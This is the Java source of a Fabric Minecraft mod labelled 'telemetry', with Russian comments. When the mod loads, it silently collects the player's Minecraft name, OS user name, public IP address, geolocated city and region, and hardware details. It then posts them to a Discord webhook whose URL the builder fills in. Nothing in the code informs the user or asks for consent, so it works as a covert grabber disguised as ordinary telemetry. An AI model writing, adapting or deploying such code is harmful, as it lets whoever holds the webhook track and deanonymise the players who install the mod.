package com.example.telemetry;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.client.MinecraftClient;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.CompletableFuture;

public class TelemetryMod implements ModInitializer {

    // ВСТАВЬ СВОЙ URL ВЕБХУКА
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/YYYY";

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .build();

    @Override
    public void onInitialize() {
        // небольшая задержка, чтобы клиент успел инициализироваться
        CompletableFuture.runAsync(() -> {
            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
            sendTelemetry();
        });
    }

    private void sendTelemetry() {
        MinecraftClient mc = MinecraftClient.getInstance();

        String username = mc.getSession().getUsername();          // ник аккаунта Minecraft
        String launcherNick = System.getProperty("user.name");    // системный юзер (ник из лаунчера/ОС)
        String time = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));

        String ip = getPublicIp();
        String region = getRegion();
        String device = getDeviceInfo();

        String content = String.format(
            "**🚀 Запуск мода**\n" +
            "**Ник (Minecraft):** `%s`\n" +
            "**Пользователь лаунчера/ОС:** `%s`\n" +
            "**Время:** `%s`\n" +
            "**IP:** `%s`\n" +
            "**Регион:** `%s`\n" +
            "**Устройство:** `%s`",
            username, launcherNick, time, ip, region, device
        );

        sendWebhook(content);
    }

    private String getPublicIp() {
        try {
            HttpRequest req = HttpRequest.newBuilder()
                    .uri(URI.create("https://api.ipify.org"))
                    .timeout(Duration.ofSeconds(5))
                    .GET().build();
            return HTTP.send(req, HttpResponse.BodyHandlers.ofString()).body();
        } catch (Exception e) {
            return "недоступно";
        }
    }

    private String getRegion() {
        try {
            HttpRequest req = HttpRequest.newBuilder()
                    .uri(URI.create("http://ip-api.com/json/?fields=country,regionName,city"))
                    .timeout(Duration.ofSeconds(5))
                    .GET().build();
            return HTTP.send(req, HttpResponse.BodyHandlers.ofString()).body();
        } catch (Exception e) {
            return "недоступно";
        }
    }

    private String getDeviceInfo() {
        return String.format(
            "OS: %s %s | Arch: %s | Java: %s | Cores: %d | RAM(max): %d MB | GPU: %s",
            System.getProperty("os.name"),
            System.getProperty("os.version"),
            System.getProperty("os.arch"),
            System.getProperty("java.version"),
            Runtime.getRuntime().availableProcessors(),
            Runtime.getRuntime().maxMemory() / (1024 * 1024),
            System.getProperty("java.vm.name")
        );
    }

    private void sendWebhook(String content) {
        try {
            String json = "{\"content\":\"" + escapeJson(content) + "\"}";
            HttpRequest req = HttpRequest.newBuilder()
                    .uri(URI.create(WEBHOOK_URL))
                    .timeout(Duration.ofSeconds(10))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(json))
                    .build();
            HTTP.send(req, HttpResponse.BodyHandlers.discarding());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String escapeJson(String s) {
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}
